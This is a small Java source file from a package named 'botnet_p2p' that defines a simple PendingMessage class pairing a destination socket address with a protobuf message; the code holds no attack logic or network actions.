package botnet_p2p;


import java.net.InetSocketAddress;

class PendingMessage {
    InetSocketAddress destination;
    MessageOuterClass.Message message;

    PendingMessage(InetSocketAddress destination, MessageOuterClass.Message message) {
        this.destination = destination;
        this.message = message;
    }
}